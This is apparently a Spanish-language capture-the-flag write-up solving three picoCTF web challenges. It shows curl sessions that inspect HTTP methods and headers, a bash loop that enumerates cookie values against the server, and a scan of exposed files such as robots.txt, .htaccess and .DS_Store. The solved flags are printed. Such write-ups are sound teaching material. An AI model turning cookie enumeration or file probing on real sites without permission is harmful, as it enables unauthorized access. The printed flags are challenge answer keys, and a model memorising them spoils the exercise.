# 01 GET aHEAD
# DESC

Find the flag being held on this server to get ahead of the competition [http://mercury.picoctf.net:47967/](http://mercury.picoctf.net:47967/)
# SOLUCION

````` python
ABRIMOS EL LINK Y NOS METEMOS AL CODIGO FUENTE 
PerfectBlack-picoctf@webshell:~$ CURL -X GET http://mercury.picoctf.net:47967/
-bash: CURL: command not found
PerfectBlack-picoctf@webshell:~$ Curl -X GET http://mercury.picoctf.net:47967/
-bash: Curl: command not found
PerfectBlack-picoctf@webshell:~$ curl -X GET http://mercury.picoctf.net:47967/

<!doctype html>
<html>
<head>
    <title>Red</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <style>body {background-color: red;}</style>
</head>
        <body>
                <div class="container">
                        <div class="row">
                                <div class="col-md-6">
                                        <div class="panel panel-primary" style="margin-top:50px">
                                                <div class="panel-heading">
                                                        <h3 class="panel-title" style="color:red">Red</h3>
                                                </div>
                                                <div class="panel-body">
                                                        <form action="index.php" method="GET">
                                                                <input type="submit" value="Choose Red"/>
                                                        </form>
                                                </div>
                                        </div>
                                </div>
                                <div class="col-md-6">
                                        <div class="panel panel-primary" style="margin-top:50px">
                                                <div class="panel-heading">
                                                        <h3 class="panel-title" style="color:blue">Blue</h3>
                                                </div>
                                                <div class="panel-body">
                                                        <form action="index.php" method="POST">
                                                                <input type="submit" value="Choose Blue"/>
                                                        </form>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>
        </body>
</html>
PerfectBlack-picoctf@webshell:~$ curl -X post http://mercury.picoctf.net:47967/

<!doctype html>
<html>
<head>
    <title>?</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <style>body {background-color: ?;}</style>
</head>
        <body>
                <div class="container">
                        <div class="row">
                                <div class="col-md-6">
                                        <div class="panel panel-primary" style="margin-top:50px">
                                                <div class="panel-heading">
                                                        <h3 class="panel-title" style="color:red">Red</h3>
                                                </div>
                                                <div class="panel-body">
                                                        <form action="index.php" method="GET">
                                                                <input type="submit" value="Choose Red"/>
                                                        </form>
                                                </div>
                                        </div>
                                </div>
                                <div class="col-md-6">
                                        <div class="panel panel-primary" style="margin-top:50px">
                                                <div class="panel-heading">
                                                        <h3 class="panel-title" style="color:blue">Blue</h3>
                                                </div>
                                                <div class="panel-body">
                                                        <form action="index.php" method="POST">
                                                                <input type="submit" value="Choose Blue"/>
                                                        </form>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>
        </body>
</html>
PerfectBlack-picoctf@webshell:~$ heat -X post http://mercury.picoctf.net:47967/
-bash: heat: command not found
PerfectBlack-picoctf@webshell:~$ curl -I  post http://mercury.picoctf.net:47967/
curl: (6) Could not resolve host: post
HTTP/1.1 200 OK
flag: picoCTF{r3j3ct_th3_du4l1ty_cca66bd3}
Content-type: text/html; charset=UTF-8




````` 
#  02 Cookies
# DESC

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/)
# SOLUCION

````` python
abrimos el citio [http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/)

PerfectBlack-picoctf@webshell:~$ for i in {1..20}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name=$i"; done | grep -oE "picoCTF\{[^}]+\}"
picoCTF{3v3ry1_l0v3s_c00k135_064663be}
````` 

# 03 Scavenger Hunt
# DESC

There is some interesting information hidden around this site [http://mercury.picoctf.net:39491/](http://mercury.picoctf.net:39491/). Can you find it?
# SOLUCION

````` python
abrimos view-source:http://mercury.picoctf.net:39491/ y encontramos la primera parte 

view-source:http://mercury.picoctf.net:39491/
view-source:http://mercury.picoctf.net:39491/robots.txt parte 2
view-source:http://mercury.picoctf.net:39491/.htaccess parte 3
view-source:http://mercury.picoctf.net:39491/.DS_Store parte 4
picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_f7ce8828}
````` 


